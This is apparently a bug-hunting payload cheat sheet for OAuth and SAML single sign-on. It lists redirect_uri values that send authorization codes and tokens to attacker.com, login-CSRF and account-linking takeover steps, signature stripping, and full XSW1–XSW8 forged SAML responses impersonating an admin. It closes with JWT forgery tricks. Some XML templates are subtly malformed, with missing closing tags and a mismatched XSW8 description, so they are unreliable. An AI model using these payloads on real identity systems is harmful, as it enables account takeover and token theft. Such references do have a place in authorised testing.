---
title: "Payloads: OAuth & SAML"
type: payloads
tags: [payloads, oauth, saml, sso, federation, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-07-02
---

# Payloads: OAuth & SAML

Federation/SSO bypass primitives. Routed via the `hunt-federation` skill. See [[oauth-attacks]], [[saml-attacks]]; tokens -> [[jwt]].

## OAuth - redirect_uri abuse (steal the code/token)
```
redirect_uri=https://attacker.com
redirect_uri=https://client.com.attacker.com            # suffix
redirect_uri=https://attacker.com/.client.com           # prefix-as-host
redirect_uri=https://client.com@attacker.com            # userinfo
redirect_uri=https://client.com/redir?url=//attacker     # open-redirect chain on the client
redirect_uri=https://client.com/callback/../evil
redirect_uri=https://client.com%2f%2f%2eattacker.com
?response_type=token  (implicit -> token in fragment)   ?response_mode=form_post
```

## OAuth - CSRF / state / flow
```
omit or reuse `state` -> login CSRF / account linking takeover
swap `code` between accounts ; replay an authorization code
prompt=none + reuse session ; downgrade PKCE (drop code_challenge)
mix-up: send the code/token to the wrong (attacker) AS/client
scope creep: add scopes the user did not consent to
```

## OAuth - account linking / pre-ATO
```
link attacker IdP identity to a victim local account (no email verify)
register victim email unverified, then victim OAuth-logs-in -> merges under attacker
```

## SAML (see [[saml-attacks]])
```
Signature stripping: remove the <ds:Signature> block entirely
XSW 1-8: clone Response/Assertion around the original signature (SAML Raider -> Apply XSW)
Certificate faking: re-sign with your key, embed your cert in <KeyInfo>
NameID comment: <NameID>admin@x.com<!--c-->.evil.com</NameID>
Missing checks: tamper/omit Recipient, Audience, InResponseTo, NotOnOrAfter -> replay
XXE / XSLT in the SAMLResponse XML
```

## SAML - XSW wrapping templates (XSW1-XSW8)

Methodology + when-to-use in [[saml-attacks]]. Base signed Response (assertion-signed case): the `<ds:Reference URI="#_orig_assertion">` binds the signature to the original assertion; the forged copy gets a **different** `ID` and your identity, with **no** signature of its own. Swap `admin@target.com` and IDs. Deflate+base64 the result for the `SAMLResponse` field. All 8 are one-click in SAML Raider (Repeater -> SAML Raider tab -> pick XSW -> Apply XSW); templates here show the exact tree each produces.

Baseline (unmodified, assertion-signed):
```xml
<samlp:Response ID="_resp">
  <saml:Assertion ID="_orig_assertion">
    <ds:Signature><ds:SignedInfo>
      <ds:Reference URI="#_orig_assertion"/>
    </ds:SignedInfo><ds:SignatureValue>...</ds:SignatureValue></ds:Signature>
    <saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

XSW1 (Response sig, enveloped): forged Response is root, original signed Response nested inside:
```xml
<samlp:Response ID="_evil_resp">
  <saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion>
  <samlp:Response ID="_resp">          <!-- original, untouched, still validly signed -->
    <ds:Signature><ds:SignedInfo><ds:Reference URI="#_resp"/></ds:SignedInfo>...</ds:Signature>
    <saml:Assertion ID="_orig_assertion"><saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject></saml:Assertion>
  </samlp:Response>
</samlp:Response>
```

XSW2 (Response sig, detached): same as XSW1 but the `<ds:Signature>` is moved out to sit as a sibling (detached) rather than enveloped by the original Response:
```xml
<samlp:Response ID="_evil_resp">
  <saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion>
  <ds:Signature><ds:SignedInfo><ds:Reference URI="#_resp"/></ds:SignedInfo>...</ds:Signature>  <!-- detached -->
  <samlp:Response ID="_resp">
    <saml:Assertion ID="_orig_assertion"><saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject></saml:Assertion>
  </samlp:Response>
</samlp:Response>
```

XSW3 (Assertion sig): forged Assertion as first-child sibling BEFORE the original:
```xml
<samlp:Response ID="_resp">
  <saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion>
  <saml:Assertion ID="_orig_assertion">      <!-- signed, unchanged -->
    <ds:Signature><ds:SignedInfo><ds:Reference URI="#_orig_assertion"/></ds:SignedInfo>...</ds:Signature>
    <saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

XSW4 (Assertion sig): original nested INSIDE the forged Assertion (child, not sibling):
```xml
<samlp:Response ID="_resp">
  <saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <saml:Assertion ID="_orig_assertion">
      <ds:Signature><ds:SignedInfo><ds:Reference URI="#_orig_assertion"/></ds:SignedInfo>...</ds:Signature>
      <saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject>
    </saml:Assertion>
  </saml:Assertion>
</samlp:Response>
```

XSW5 (Assertion sig): forged Assertion envelopes the Signature; original assertion body relocated so the reference still resolves:
```xml
<samlp:Response ID="_resp">
  <saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <ds:Signature><ds:SignedInfo><ds:Reference URI="#_orig_assertion"/></ds:SignedInfo>...</ds:Signature>
  </saml:Assertion>
  <saml:Assertion ID="_orig_assertion"><saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject></saml:Assertion>
</samlp:Response>
```

XSW6 (Assertion sig): forged Assertion envelopes the Signature, which envelopes the original Assertion (deeper nest of XSW5):
```xml
<samlp:Response ID="_resp">
  <saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <ds:Signature><ds:SignedInfo><ds:Reference URI="#_orig_assertion"/></ds:SignedInfo>...
      <saml:Assertion ID="_orig_assertion"><saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Assertion>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

XSW7 (Assertion sig): forged unsigned Assertion inside a schema-lax `<Extensions>`; original stays put:
```xml
<samlp:Response ID="_resp">
  <saml:Extensions>
    <saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion>
  </saml:Extensions>
  <saml:Assertion ID="_orig_assertion">
    <ds:Signature><ds:SignedInfo><ds:Reference URI="#_orig_assertion"/></ds:SignedInfo>...</ds:Signature>
    <saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

XSW8 (Assertion sig): forged Assertion in the normal position; original assertion (signature stripped) hidden in an `<Object>` block. Use when the SP rejects `Extensions`:
```xml
<samlp:Response ID="_resp">
  <saml:Assertion ID="_evil"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <ds:Signature><ds:SignedInfo><ds:Reference URI="#_orig_assertion"/></ds:SignedInfo>...
      <ds:Object>
        <saml:Assertion ID="_orig_assertion"><saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Assertion>
      </ds:Object>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

## JWT (the bearer after SSO)
```
alg:none ; weak HS256 secret (hashcat -m 16500) ; kid path traversal/SQLi ; jku/x5u -> attacker JWKS
confuse RS256 -> HS256 using the public key as the HMAC secret
```

## Real-world
redirect_uri suffix/userinfo bypasses and missing `state` are classic OAuth ATOs; SAML signature-stripping/XSW and Golden SAML (SolarWinds) are the canonical federation breaks.
